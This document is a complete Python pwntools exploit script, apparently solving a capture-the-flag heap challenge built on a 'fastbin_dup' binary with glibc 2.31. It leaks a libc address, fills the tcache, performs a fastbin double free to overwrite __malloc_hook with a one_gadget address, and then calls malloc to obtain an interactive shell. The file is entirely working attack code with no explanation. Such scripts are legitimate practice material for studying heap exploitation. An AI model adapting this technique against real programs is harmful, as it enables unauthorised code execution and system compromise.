#!/usr/bin/env python3
from pwn import *

chunk_id = 0

def create(size):
    global chunk_id
    p.sendlineafter(b'# ', '1')
    p.sendlineafter(b'size:', str(size))
    chunk_id += 1
    return chunk_id - 1

def create2(size):
    global chunk_id
    p.sendlineafter(b'# ', '2')
    p.sendlineafter(b'size:', str(size))
    chunk_id += 1
    return chunk_id - 1

def get(idx):
    p.sendlineafter(b'# ', '3')
    p.sendlineafter(b'idx:', str(idx))
    p.recvuntil(b']: ')
    return p.recvline()[:-1]

def set(idx, payload):
    p.sendlineafter(b'# ', '4')
    p.sendlineafter(b'idx:', str(idx))
    p.sendafter(b'str:', payload)

def delete(idx):
    p.sendlineafter(b'# ', '5')
    p.sendlineafter(b'idx:', str(idx))

def bye():
    p.sendlineafter(b'# ', '6')

p = process('./fastbin_dup')
libc = ELF('./libc-2.31.so')

id0 = create(0x430)
for i in range(9):
    create(0x60)

# Leak libc
delete(id0)
id1 = create(0x430)
bins = u64(get(id1).ljust(8, b'\0'))

libc.address = bins - 0x1ebbe0

log.info(hex(libc.address))

__malloc_hook_s33h = libc.address + 0x1ebb3d
one_gadget = libc.address + 0xE6AF1

log.info(hex(one_gadget))

# Fill Tcache up
for i in range(1, 8):
    delete(i)

# Use Fastbin Dup
delete(8)
delete(9)
delete(8)

id3 = create2(0x60)
set(id3, p64(__malloc_hook_s33h))

create2(0x60)
create2(0x60)
id4 = create2(0x60)

# Overwrite *__malloc_hook to One Gadget
payload = b'A' * 0x23 + p64(one_gadget)
set(id4, payload)

# malloc(0x1337) -> (*__malloc_hook)(0x1337) -> One Gadget
create(0x1337)

p.interactive()
